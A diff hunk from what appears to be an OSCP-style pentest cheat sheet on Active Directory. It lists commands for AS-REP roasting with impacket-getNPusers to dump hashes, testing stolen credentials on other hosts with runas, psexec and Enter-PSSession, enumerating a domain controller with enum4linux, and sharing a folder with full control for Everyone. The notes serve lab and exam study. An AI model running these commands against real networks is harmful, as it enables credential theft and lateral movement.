@@ -40,8 +40,7 @@ impacket-getNPusers oscp.labs/username [ this is reproasting]
 impacket-getNPusers oscp.labs/username -outputfile username.asrep [extract hases]
 
 runas /user:oscp\username cmd.exe [login to other user in domain inside cmd]
-things to check [runas /user:DEVICENAME\username cmd.exe, Enter-PSSession -ComputerName D2 -Credential ab.com\username, psexec \\D2 -u ab.com\username -p <password> cmd.exe, runas /netonly /user:ab.com\username cmd.exe to check if user can login using his credentials to other device]
-
+things to try [runas /user:DEVICENAME\username cmd.exe, Enter-PSSession -ComputerName D2 -Credential ab.com\username, psexec \\D2 -u ab.com\username -p <password> cmd.exe, runas /netonly /user:ab.com\username cmd.exe to check if user can login using his credentials to other device]
 enum4linux -A 10.10.1.200 [Domain Controller ip]
 
 net share public=c:\Users\Name-folder-to-share /GRANT:everyone,FULL [share folder through cmd, incase access issue add everyone group manually from right click on folder in security and add username or group]
